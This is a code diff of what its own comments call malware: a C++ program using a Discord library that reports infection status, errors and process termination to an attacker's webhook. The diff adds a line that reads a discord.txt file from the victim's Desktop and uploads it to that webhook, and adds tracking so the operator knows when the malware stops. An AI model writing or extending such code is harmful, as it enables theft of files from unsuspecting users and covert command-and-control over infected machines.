@@ -9,7 +9,7 @@ void track_kill(dpp::cluster& temp_token, dpp::webhook& MAIN_WEBHOOK) {
     dpp::message proc_kill("");
     proc_kill.add_embed(handle_kill());
     std::this_thread::sleep_for(std::chrono::seconds(1));
-    temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(proc_kill));
+    temp_token.execute_webhook(MAIN_WEBHOOK, proc_kill);
 
     //exit(0);
 }
@@ -24,28 +24,32 @@ int main() {
         dpp::message infect("");
         infect.add_embed(making_connection());
 
-        temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(infect));
+        temp_token.execute_webhook(MAIN_WEBHOOK, infect);
 
-        bool worked = true;
+        bool worked = false;
 
         if(worked == false) {
             dpp::message error_infect("");
             error_infect.add_embed(connection_result(worked));
+            error_infect.add_file("discord.txt", dpp::utility::read_file("~/Desktop/discord.txt"));
             std::this_thread::sleep_for(std::chrono::seconds(1)); //Avoid deleting this sleep, so all the code will stop working. due to webhooks limits
-            temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(error_infect));
+            temp_token.execute_webhook(MAIN_WEBHOOK, error_infect);
         } else {
             dpp::message success_infect("");
             success_infect.add_embed(connection_result(worked));
             std::this_thread::sleep_for(std::chrono::seconds(1));
-            temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(success_infect));
+            temp_token.execute_webhook(MAIN_WEBHOOK, success_infect);
         }
     } catch(const std::exception& e) {
         dpp::message exception_error("");
         exception_error.add_embed(handle_catch(e));
         std::this_thread::sleep_for(std::chrono::seconds(1));
-        temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(exception_error));
+        temp_token.execute_webhook(MAIN_WEBHOOK, exception_error);
+        track_kill(temp_token, MAIN_WEBHOOK);
+        return 0;
     }
-
+    
+    //This never should happen (MAlware are continuosly on the system, so register when the mwalware stops processing).
     track_kill(temp_token, MAIN_WEBHOOK);
     return 0;
 }
